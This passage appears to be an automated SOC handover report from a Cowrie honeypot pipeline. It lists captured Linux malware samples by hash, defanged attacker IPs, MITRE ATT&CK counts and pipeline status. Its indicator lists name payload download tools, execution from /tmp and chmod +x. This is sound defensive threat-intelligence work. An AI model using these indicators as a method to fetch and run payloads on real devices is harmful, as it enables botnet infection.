| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `287962211de7bcadb39f7576732438b43ee6aab420ec23c29a9d12a8151a547f` | ELF Binary (Linux executable) (x86 32-bit) | `287962211de7bcad...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `2f206563640dd66a743ffd493ce0e3c31a8fc5a24b9f5d2b540fc22d45c13d66` | ELF Binary (Linux executable) (x86 32-bit) | `2f206563640dd66a...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `31d4181843b1ed10a7e7cb3f108f6d6c50a7a4452ee52ddacabe8ca77260615e` | Bash Script | `31d4181843b1ed10...` | 60/100 | 🟡 MEDIUM | **26/75** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `138.185.199[.]250` | BR | BS CONECT TELECOMUNICAÇOES LTDA | **100** ⚠️ | 0 |
| `177.67.156[.]50` | BR | F.J.FANTINI AMPARO ME | **100** ⚠️ | 2 |
| `194.165.16[.]123` | LT | Flyservers S.A. | **100** ⚠️ | 10 |
| `176.53.159[.]196` | PL | BearShield Technologies S.R.O. | **100** ⚠️ | 50 |
| `91.238.181[.]94` | FR | VDS&VPN services | **100** ⚠️ | 0 |
| `164.92.115[.]22` | US | DigitalOcean, LLC | **100** ⚠️ | 0 |
| `170.233.29[.]157` | AR | TECNET ARGENTINA S.A. | **100** ⚠️ | 0 |
| `211.178.165[.]251` | KR | SK Broadband Co Ltd | **100** ⚠️ | 0 |
| `111.70.23[.]223` | TW | CHT-Mobile business Group,Chunghwa | **100** ⚠️ | 0 |
| `218.25.233[.]22` | CN | China Unicom Liaoning province network | **100** ⚠️ | 0 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 190 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 181 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 1 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 1 |

---

## 🔕 False Positive Summary (16 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| AbuseIPDB score 17 below threshold 25 | 1 |
| AbuseIPDB score 2 below threshold 25 | 1 |
| AbuseIPDB score 4 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 11 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 246 cases |
| Tool 34  | Credential Extractor        | ✅ 197 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 7 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 77 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 16 filtered (6.5%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 52 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 22 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 181 priority case(s) shown individually · 26 recon entry/entries in table (9 group(s) consolidating 32 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-08-08T10:38:44Z_
